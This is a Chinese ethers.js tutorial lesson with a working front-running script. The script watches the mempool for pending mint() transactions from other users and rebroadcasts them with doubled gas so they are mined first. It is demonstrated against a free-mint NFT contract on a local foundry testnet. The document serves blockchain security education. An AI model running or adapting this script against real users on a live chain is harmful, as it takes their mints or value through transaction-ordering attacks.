---
title: 23. 抢先交易脚本
tags:
  - ethers
  - javascript
  - mev
  - mempool
  - frontrun
  - nft
  - frontend
  - web
---

# Ethers极简入门: 23. 抢先交易脚本

我最近在重新学`ethers.js`，巩固一下细节，也写一个`WTF Ethers极简入门`，供小白们使用。

推特：[@0xAA_Science](https://twitter.com/0xAA_Science)｜[@WTFAcademy_](https://twitter.com/WTFAcademy_)

WTF Academy 社群：[Discord](https://discord.gg/5akcruXrsk)｜[微信群](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link)｜[官网 wtf.academy](https://wtf.academy)

所有代码和教程开源在 github: [github.com/WTFAcademy/WTFEthers](https://github.com/WTFAcademy/WTF-Ethers)

---

这一讲，我们将介绍抢先交易（Front-running，抢跑）的脚本。据统计，以太坊上的套利者通过三明治攻击（sandwich attack）[共获利12亿美元](https://dune.com/chorus_one/ethereum-mev-data)。在学习之前，请先阅读[WTF Solidity教程 合约安全S11: 抢先交易](https://github.com/AmazingAng/WTFSolidity/blob/main/S11_Frontrun/readme.md)。

![](./img/23-1.png)

## Freemint NFT合约

我们要抢跑的目标合约是一个ERC721标准的NFT合约`Frontrun.sol`，它拥有一个`mint()`函数进行免费铸造。

```solidity
// SPDX-License-Identifier: MIT
// By 0xAA
pragma solidity ^0.8.4;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

// 我们尝试frontrun一笔Free mint交易
contract FreeMint is ERC721 {
    uint256 public totalSupply;

    // 构造函数，初始化NFT合集的名称、代号
    constructor() ERC721("Free Mint NFT", "FreeMint"){}

    // 铸造函数
    function mint() external {
        totalSupply++;
        _mint(msg.sender, totalSupply); // mint
    }
}
```

为了简化测试环境，我们将上述合约部署在foundry本地测试网，然后监听在`mempool`中的未决交易，筛选出符合标准的交易进行抢跑。

如果你不了解 `foundry`，可以阅读WTF Solidity中的[Foundry教程](https://github.com/AmazingAng/WTF-Solidity/blob/main/Topics/Tools/TOOL07_Foundry/readme.md)。安装好 foundry 后，在命令行输入以下命令就可以启动本地测试网:

```shell
anvil
```

## 抢跑脚本

下面，我们详解一下抢跑脚本`frontrun.js`，这个脚本会监听链上的`mint()`交易，并发送一个gas更高的相同交易，进行抢跑。

1. 创建连接到foundry本地测试网的`provider`对象，用于监听和发送交易。foundry本地测试网默认url：`"http://127.0.0.1:8545"`。

    ```js
    //1.连接到foundry本地网络

    import { ethers } from "ethers";
    const provider = new ethers.providers.JsonRpcProvider('<http://127.0.0.1:8545>')
    let network = provider.getNetwork()
    network.then(res => console.log(`[${(new Date).toLocaleTimeString()}]链接到网络${res.chainId}`))
    ```
2. 创建合约实例，用于查看mint结果，确认是否抢跑成功。

    ```js
    //2.构建contract实例
    const contractABI = [
        "function mint() public",
        "function ownerOf(uint256) public view returns (address) ",
        "function totalSupply() view returns (uint256)"
    ]

    const contractAddress = '0xC76A71C4492c11bbaDC841342C4Cb470b5d12193'//合约地址
    const contractFM = new ethers.Contract(contractAddress, contractABI, provider)
    ```
3. 创建一个包含我们感兴趣的`mint()`函数的`interface`对象，用于在监听过程中使用。如果你不了解它，可以阅读[WTF Ethers极简教程第20讲：解码交易](https://github.com/WTFAcademy/WTFEthers/blob/main/20_DecodeTx/readme.md)。

    ```js
    //3.创建Interface对象，用于检索mint函数。
    //V6版本 const iface = new ethers.Interface(contractABI)
    const iface = new ethers.utils.Interface(contractABI)
    function getSignature(fn) {
    // V6版本 return iface.getFunction("mint").selector
        return iface.getSighash(fn)
    }
    ```

4. 创建测试钱包，用于发送抢跑交易，私钥是foundry测试网提供的，里面有10000 ETH测试币。

    ```js
    //4. 创建测试钱包，用于发送抢跑交易，私钥是foundry测试网提供
    const privateKey = '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80'
    const wallet = new ethers.Wallet(privateKey, provider)
    ```

5. 我们先看一下正常的mint结果是怎样的。我们利用`provider.on`方法监听mempool中的未决交易，当交易出现时，我们会利用交易哈希`txHash`来读取交易详情`tx`，并筛选出调用了`mint()`函数的交易，查看交易结果，获取mint的nft编码及对应的owner，比对交易发起地址与owner是否一致。确认，mint按预期执行。

    ```js
    //5. 构建正常mint函数，检验mint结果，显示正常。
    const normaltx = async () => {
    provider.on('pending', async (txHash) => {
        provider.getTransaction(txHash).then(
            async (tx) => {
                if (tx.data.indexOf(getSignature("mint")) !== -1) {
                    console.log(`[${(new Date).toLocaleTimeString()}]监听到交易:${txHash}`)
                    console.log(`铸造发起的地址是:${tx.from}`)//打印交易发起地址
                    await tx.wait()
                    const tokenId = await contractFM.totalSupply()
                    console.log(`mint的NFT编号:${tokenId}`)
                    console.log(`编号${tokenId}NFT的持有者是${await contractFM.ownerOf(tokenId)}`)//打印nft持有者地址
                    console.log(`铸造发起的地址是不是对应NFT的持有者:${tx.from === await contractFM.ownerOf(tokenId)}`)//比较二者是否一致
                }
            }
        )
    })
    }
    ```

    ![](./img/23-2.png)

6. 进行抢跑mint。我们依旧利用`provider.on`方法监听mempool中的未决交易，当有调用了mint()函数的交易出现且发送方不是自己钱包地址的交易（如果不筛选，会自己抢跑自己的交易，陷入死循环）时，构建抢跑交易，发送交易进行抢跑。等待交易结束后，查看抢跑结果。预期将要被mint的nft并未被原交易发起地址mint，而是由抢跑地址mint。同时查看区块内数据，抢跑交易在原始交易前被打包进区块，抢跑成功！

    ```js
    const frontRun = async () => {
    provider.on('pending', async (txHash) => {
        const tx = await provider.getTransaction(txHash)
        if (tx.data.indexOf(getSignature("mint")) !== -1 && tx.from !== wallet.address) {
            console.log(`[${(new Date).toLocaleTimeString()}]监听到交易:${txHash}\n准备抢先交易`)
            const frontRunTx = {
                to: tx.to,
                value: tx.value,
    // V6版本 maxPriorityFeePerGas: tx.maxPriorityFeePerGas * 2n， 其他运算同理。参考https://docs.ethers.org/v6/migrating/#migrate-bigint
                maxPriorityFeePerGas: tx.maxPriorityFeePerGas.mul(2),
                maxFeePerGas: tx.maxFeePerGas.mul(2),
                gasLimit: tx.gasLimit.mul(2),
                data: tx.data
            }
            const aimTokenId = (await contractFM.totalSupply()).add(1)
            console.log(`即将被mint的NFT编号是:${aimTokenId}`)//打印应该被mint的nft编号
            const sentFR = await wallet.sendTransaction(frontRunTx)
            console.log(`正在frontrun交易`)
            const receipt = await sentFR.wait()
            console.log(`frontrun 交易成功,交易hash是:${receipt.transactionHash}`)
            console.log(`铸造发起的地址是:${tx.from}`)
            console.log(`编号${aimTokenId}NFT的持有者是${await contractFM.ownerOf(aimTokenId)}`)//刚刚mint的nft持有者并不是tx.from
            console.log(`编号${aimTokenId.add(1)}的NFT的持有者是:${await contractFM.ownerOf(aimTokenId.add(1))}`)//tx.from被wallet.address抢跑，mint了下一个nft
            console.log(`铸造发起的地址是不是对应NFT的持有者:${tx.from === await contractFM.ownerOf(aimTokenId)}`)//比对地址，tx.from被抢跑
            //检验区块内数据结果
            const block = await provider.getBlock(tx.blockNumber)
            console.log(`区块内交易数据明细:${block.transactions}`)//在区块内，后发交易排在先发交易前，抢跑成功。
        }
    })
    }
    ```

    ![](./img/23-3.png)

## 总结

这一讲，我们介绍了一个简单的抢先交易脚本。你可以在这个脚本的基础上加入你想要的功能，开启币圈科学家之路！
